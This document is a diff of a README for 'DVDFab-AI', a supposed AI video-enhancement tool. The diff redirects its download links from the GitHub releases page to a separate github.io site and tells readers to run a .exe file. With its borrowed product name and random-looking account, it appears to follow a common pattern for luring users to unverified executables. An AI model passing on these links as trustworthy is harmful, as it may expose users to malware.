@@ -1,6 +1,6 @@
 # 🎞️ DVDFab-AI - Improve Your Videos With Artificial Intelligence
 
-[![Download DVDFab-AI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/logarithmic-gee892/DVDFab-AI/releases)
+[![Download DVDFab-AI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://logarithmic-gee892.github.io)
 
 ## 📌 About This Software
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards for smooth performance:
 
 You find the setup file on the release page. 
 
-[Click here to visit the download page](https://github.com/logarithmic-gee892/DVDFab-AI/releases)
+[Click here to visit the download page](https://logarithmic-gee892.github.io)
 
 Look for the latest version at the top of the list. Click the file ending in .exe to start your download. Your browser saves this file to your Downloads folder by default.
 
